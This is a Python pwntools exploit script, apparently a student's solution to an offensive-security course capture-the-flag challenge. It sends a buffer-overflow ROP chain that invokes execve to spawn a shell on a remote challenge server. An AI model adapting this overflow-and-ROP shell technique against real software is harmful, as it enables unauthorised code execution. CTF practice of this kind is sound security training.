#import from py
import re

#outside imports
from pwn import *

#used for pulling the flag from output
flag_regex = r"flag\{[^}]+\}"
global_timeout = 5 #seconds

#challenge-specific info
host = 'offsec-chalbroker.osiris.cyber.nyu.edu'
port = 1342
netid='pk1898'

do_remote = True
binary_name = './inspector'

#for doing local debugging
is_local_dbg = False
gdb_script = '''
set pagination off
set disassembly-flavor intel
i proc mappings
b*0x00400678
b*0x00400672
b main
'''

#universal flag finder, given a string
def find_flag(input):
    m = re.findall(flag_regex, input)
    if(m != []):
        return m[0]
    else:
        return None


def solve(target):
    DATA = ''
    # DATA += 'A' * 2048
    # DATA += p64(0x00400621)
    # DATA += p64(0x00400621)
    # DATA += p64(0x00400621)

    # uncomment these
    DATA += ('AAAAAAAA')
    DATA += ('AAAAAAAA')
    DATA += ('AAAAAAAA')
    DATA += ('AAAAAAAA')
    DATA += ('AAAAAAAA')

    DATA += p64(0x00400646)  # first called after padding.
    DATA += p64(0x3b)
    DATA += p64(0x0040063e)
    DATA += p64(0x00)
    DATA += p64(0x00400636)
    DATA += p64(0x00)
    DATA += p64(0x0040062e)
    DATA += p64(0x00400708)
    DATA += p64(0x00400625)
    print
    target.read()
    print
    DATA
    target.sendline(DATA)
    target.interactive()


#universal target setup for remote-only
def target():
    if(do_remote):
        r = remote(host, port)
        r.sendline(netid)
        r.recvline() # eat interstitial
        return r
    else:
        if(is_local_dbg):
            target = gdb.debug(binary_name, gdb_script)
        else:
            target = process(binary_name)
        return target

#scaffolding
def main():
    with target() as p:
        flag = solve(p)
    if(flag):
        print "Challenge Solved: %s" % flag
    else:
        print "Challenge Not Solved"

if __name__ == '__main__':
    main()
